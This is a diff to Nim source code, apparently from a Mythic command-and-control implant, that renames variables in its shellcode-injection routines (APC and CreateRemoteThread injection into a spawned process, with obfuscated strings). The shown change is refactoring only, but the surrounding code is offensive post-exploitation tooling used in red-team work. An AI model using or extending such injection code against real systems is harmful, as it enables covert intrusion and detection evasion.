@@ -153,9 +153,9 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
       
       # Get spawnto path based on architecture
       when hostCPU == "amd64":
-        let (spawntoPath, spawntoArgs) = getSpawntoX64()
+        let (spawntoPath, _) = getSpawntoX64()
       else:
-        let (spawntoPath, spawntoArgs) = getSpawntoX86()
+        let (spawntoPath, _) = getSpawntoX86()
       
       if spawntoPath.len == 0:
         return (false, obf("spawnto path is not set for this architecture"))
@@ -223,9 +223,9 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
       
       # Get spawnto path based on architecture
       when hostCPU == "amd64":
-        let (spawntoPath, spawntoArgs) = getSpawntoX64()
+        let (spawntoPath, _) = getSpawntoX64()
       else:
-        let (spawntoPath, spawntoArgs) = getSpawntoX86()
+        let (spawntoPath, _) = getSpawntoX86()
       
       if spawntoPath.len == 0:
         return (false, obf("spawnto path is not set for this architecture"))
@@ -377,19 +377,19 @@ proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode
       
       debug &"[DEBUG] Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
       
-      var result: tuple[success: bool, error: string]
+      var injResult: tuple[success: bool, error: string]
       case args.technique.toLower():
       of obf("apc"):
-        result = injectViaAPC(finalShellcode)
+        injResult = injectViaAPC(finalShellcode)
       of obf("createremotethread"):
-        result = injectViaCreateRemoteThread(finalShellcode)
+        injResult = injectViaCreateRemoteThread(finalShellcode)
       else:
         return mythicError(taskId, obf("Unknown injection technique: ") & args.technique)
       
-      if result.success:
+      if injResult.success:
         return mythicSuccess(taskId, obf("Shellcode injected successfully via ") & args.technique)
       else:
-        return mythicError(taskId, obf("Failed to inject shellcode via ") & args.technique & ": " & result.error)
+        return mythicError(taskId, obf("Failed to inject shellcode via ") & args.technique & ": " & injResult.error)
       
     except Exception as e:
       return mythicError(taskId, obf("Inject hollow execution error: ") & e.msg)
